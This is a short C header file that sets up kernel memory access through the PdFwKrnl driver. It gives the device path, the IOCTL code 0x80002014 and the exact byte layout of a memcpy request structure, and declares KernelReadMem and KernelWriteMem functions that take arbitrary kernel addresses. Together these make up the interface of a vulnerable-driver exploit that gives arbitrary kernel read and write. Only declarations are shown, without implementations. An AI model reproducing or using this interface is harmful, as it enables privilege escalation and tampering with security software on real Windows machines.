#pragma once
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>

#define PDFW_DEVICE_PATH     L"\\\\.\\Global\\PdFwKrnl"
#define IOCTL_AMDPDFW_MEMCPY 0x80002014UL

// Kernel memmove(dst, src, size) dispatched via IOCTL to the PdFwKrnl driver
#pragma pack(push, 1)
typedef struct _PDFW_MEMCPY
{
    BYTE  Reserved[16];  // 0x00
    PVOID Destination;   // 0x10
    PVOID Source;        // 0x18
    PVOID Reserved2;     // 0x20
    DWORD Size;          // 0x28
    DWORD Reserved3;     // 0x2C
} PDFW_MEMCPY, * PPDFW_MEMCPY;
#pragma pack(pop)

// -----------------------
// Functions
// -----------------------

HANDLE OpenPdFwDevice(VOID);

BOOL KernelReadMem(
    _In_  HANDLE     hDev,
    _In_  ULONG_PTR  uAddr,
    _Out_ PVOID      pBuffer,
    _In_  SIZE_T     cbBuffer
);

BOOL KernelWriteMem(
    _In_ HANDLE     hDev,
    _In_ ULONG_PTR  uAddr,
    _In_ PVOID      pBuffer,
    _In_ SIZE_T     cbBuffer
);
